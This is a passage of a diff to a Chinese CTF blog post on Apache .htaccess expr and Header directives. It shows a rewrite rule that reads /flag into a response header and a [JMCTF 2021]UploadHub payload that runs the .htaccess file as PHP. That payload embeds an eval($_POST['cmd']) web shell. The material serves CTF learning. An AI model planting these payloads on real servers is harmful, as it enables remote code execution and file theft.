-2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>表达式返回<strong>布尔值</strong>（true&#x2F;false）或<strong>字符串</strong>，取决于使用场景。</p>
+<p>操作符</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">操作符</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">比较</td>
+<td align="left"><code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></td>
+<td align="left"><code>%&#123;REMOTE_ADDR&#125; == &#39;192.168.1.100&#39;</code></td>
+</tr>
+<tr>
+<td align="left">正则</td>
+<td align="left"><code>=~</code>, <code>!~</code>（匹配，不匹配）</td>
+<td align="left"><code>%&#123;REQUEST_URI&#125; =~ m#^/admin#</code></td>
+</tr>
+<tr>
+<td align="left">逻辑</td>
+<td align="left"><code>&amp;&amp;</code>, &#96;</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">字符串</td>
+<td align="left"><code>-strcmp</code>, <code>-strlen</code></td>
+<td align="left"><code>-strlen(%&#123;QUERY_STRING&#125;) &gt; 0</code></td>
+</tr>
+<tr>
+<td align="left">存在性</td>
+<td align="left"><code>-f</code>, <code>-d</code>, <code>-e</code></td>
+<td align="left"><code>-f /etc/passwd</code></td>
+</tr>
+</tbody></table></div>
+<p>其中正则中的<code>m# #</code>等同于<code>/.../</code>用来包裹正则表达式不进行匹配，优点在于遇到<code>/</code>的时候不需要进行转义，<code>/.../</code>中需要进行转义。</p>
+<p><strong>常用内置函数</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">作用</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>file(path)</code></td>
+<td align="left"><strong>读取文件内容</strong></td>
+<td align="left"><code>file(&#39;/etc/passwd&#39;)</code></td>
+</tr>
+<tr>
+<td align="left"><code>req(path)</code></td>
+<td align="left">发起内部子请求</td>
+<td align="left"><code>req(&#39;/status&#39;)</code></td>
+</tr>
+<tr>
+<td align="left"><code>resty(string)</code></td>
+<td align="left">URL 解码</td>
+<td align="left"><code>resty(&#39;%2f&#39;)</code> → <code>/</code></td>
+</tr>
+<tr>
+<td align="left"><code>base64(string)</code></td>
+<td align="left">Base64 编码</td>
+<td align="left"><code>base64(&#39;admin&#39;)</code> → <code>YWRtaW4=</code></td>
+</tr>
+<tr>
+<td align="left"><code>unbase64(string)</code></td>
+<td align="left">Base64 解码</td>
+<td align="left"><code>unbase64(&#39;YWRtaW4=&#39;)</code> → <code>admin</code></td>
+</tr>
+<tr>
+<td align="left"><code>hex(string)</code></td>
+<td align="left">十六进制编码</td>
+<td align="left"><code>hex(&#39;abc&#39;)</code> → <code>616263</code></td>
+</tr>
+<tr>
+<td align="left"><code>unhex(string)</code></td>
+<td align="left">十六进制解码</td>
+<td align="left"><code>unhex(&#39;616263&#39;)</code> → <code>abc</code></td>
+</tr>
+<tr>
+<td align="left"><code>escape(string)</code></td>
+<td align="left">URL 编码</td>
+<td align="left"><code>escape(&#39;/&#39;)</code> → <code>%2F</code></td>
+</tr>
+<tr>
+<td align="left"><code>unescape(string)</code></td>
+<td align="left">URL 解码（同 resty）</td>
+<td align="left"><code>unescape(&#39;%2F&#39;)</code> → <code>/</code></td>
+</tr>
+<tr>
+<td align="left"><code>time()</code></td>
+<td align="left">当前时间戳</td>
+<td align="left"><code>time()</code></td>
+</tr>
+<tr>
+<td align="left"><code>strlen(string)</code></td>
+<td align="left">字符串长度</td>
+<td align="left"><code>strlen(&#39;abc&#39;)</code> → 3</td>
+</tr>
+</tbody></table></div>
+<p><strong>重点</strong>：<code>file()</code> 函数可以读取服务器上的任意文件（只要 Apache 用户有权限）！</p>
+<p>很多expr表达式基本上都是用不上的，所以就不要纠结expr该怎么写了，遇到对应的题目记一下就行了。</p>
+<p>比如读取flag然后设置到响应头中</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br><span class="line">RewriteRule .* - [E=FLAG:%1]</span><br><span class="line">Header set X-Flag &quot;%&#123;FLAG&#125;e&quot;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="4-Header操作响应头"><a href="#4-Header操作响应头" class="headerlink" title="4.Header操作响应头"></a>4.Header操作响应头</h2><p>htaccess文件单独操作唯一的外带方式就只有响应头了。</p>
+<p>基本语法</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header [条件] 动作 头名称 &quot;值&quot; [早期|晚期]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>其中早期和晚期指的是early和late，指的是在生成相应前后执行Header指令，默认为late，大多数时候使用late。</p>
+<p>示例</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Custom &quot;Hello World&quot;</span><br><span class="line"># 添加响应头 X-Custom: Hello World</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p><strong>核心动作</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">动作</th>
+<th align="left">作用</th>
+<th align="left">示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>set</code></strong></td>
+<td align="left">设置头（如果存在则覆盖）</td>
+<td align="left"><code>Header set X-Frame-Options &quot;SAMEORIGIN&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>append</code></strong></td>
+<td align="left">追加值（如果存在，用逗号分隔）</td>
+<td align="left"><code>Header append Cache-Control &quot;public&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>merge</code></strong></td>
+<td align="left">合并值（去重后追加）</td>
+<td align="left"><code>Header merge Cache-Control &quot;public&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>add</code></strong></td>
+<td align="left">添加头（不覆盖，可重复）</td>
+<td align="left"><code>Header add Set-Cookie &quot;session=123&quot;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>unset</code></strong></td>
+<td align="left">删除头</td>
+<td align="left"><code>Header unset X-Powered-By</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>echo</code></strong></td>
+<td align="left">回显请求头到响应（调试用）</td>
+<td align="left"><code>Header echo X-Request-ID</code></td>
+</tr>
+</tbody></table></div>
+<p><strong>条件（可选）</strong></p>
+<p>基于响应状态</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Header always set X-Debug &quot;true&quot;  # 所有响应都加，包括错误页</span><br><span class="line">Header onsuccess set X-Cache &quot;HIT&quot; # 仅 2xx 响应</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">条件</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>always</code></td>
+<td align="left">所有响应（包括错误页）</td>
+</tr>
+<tr>
+<td align="left"><code>onsuccess</code></td>
+<td align="left">仅成功响应（2xx）</td>
+</tr>
+<tr>
+<td align="left"><code>onerror</code></td>
+<td align="left">仅错误响应（4xx&#x2F;5xx）</td>
+</tr>
+</tbody></table></div>
+<p>基于环境变量</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Block &quot;true&quot; env=BLOCK_IT</span><br><span class="line"># 仅当环境变量 BLOCK_IT 存在时才加</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>其中我们常通过捕获组配合Header返回flag</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br><span class="line">RewriteRule .* - [E=FLAG_CONTENT:%1]</span><br><span class="line">Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+
+
+
+
+
+
 <h2 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h2><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">Require all granted  </span><br><span class="line">php_flag engine on	</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>这段 <code>.htaccess</code> 文件的内容是一个<strong>恶意配置</strong>，旨在通过Apache的配置文件实现<strong>PHP代码执行</strong></p>
@@ -23,8 +675,8 @@
 
 <div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">Require all granted  </span><br><span class="line">php_flag engine on	</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line"><span class="comment">#&lt;?php var_dump(file_get_contents(&#x27;/flag&#x27;));?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
-</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 Regulus 于 2025-06-08 19:26:43 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2025/06/08/htaccess/">htaccess</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/06/08/htaccess/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>Mei的小窝</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#htaccess%E6%96%87%E4%BB%B6payload"><span class="toc-list-text">htaccess文件payload</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">前言</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#JMCTF-2021-UploadHub"><span class="toc-list-text">[JMCTF 2021]UploadHub</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2025/06/08/htaccess/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
-搜索</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="请输入关键词进行站内搜索……" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">© 2024 - 2026 <span>💗</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div><div id="footer-statistic"><span>共撰写169篇文章，全站共461.6k字</span></div><div id="footer-pageview"><div id="container_site_pv"><span>🔥总访问量</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>🐈访客人数</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+</div><div class="post-reward"><div class="post-reward-btn" title="赞赏作者"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">致谢名单</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">本作品由 Regulus 于 2025-06-08 19:26:43 发布</div><div class="post-copyright-link"><span>作品地址：<a href="http://example.com/2025/06/08/htaccess/">htaccess文件配置</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/06/08/htaccess/">复制</button></div><div class="post-copyright-detail">除特别声明外，本站作品均采用 <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> 许可协议，转载请注明来自 <a href='/'>Mei的小窝</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>目录</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#htaccess%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE%E5%8F%8Apayload"><span class="toc-list-text">htaccess文件配置及payload</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">前言</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-htaccess%E6%96%87%E4%BB%B6%E6%A0%B8%E5%BF%83%E7%BB%84%E6%88%90"><span class="toc-list-text">1. .htaccess文件核心组成</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-htaccess-%E7%9A%84%E6%A0%B8%E5%BF%83%E4%BD%9C%E7%94%A8"><span class="toc-list-text">2. .htaccess 的核心作用</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-URL-%E9%87%8D%E5%86%99"><span class="toc-list-text">1. URL 重写</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-Order-Allow-Deny%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-list-text">2.Order, Allow, Deny访问控制</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-Require%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-list-text">3.Require访问控制</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#4-%E5%A4%84%E7%90%86%E5%99%A8%E6%8C%87%E4%BB%A4"><span class="toc-list-text">4.处理器指令</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-expr%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-list-text">3.expr表达式</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="toc-list-text">1.语法结构</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-Header%E6%93%8D%E4%BD%9C%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-list-text">4.Header操作响应头</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#JMCTF-2021-UploadHub"><span class="toc-list-text">[JMCTF 2021]UploadHub</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="http://example.com/2025/06/08/htaccess/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img 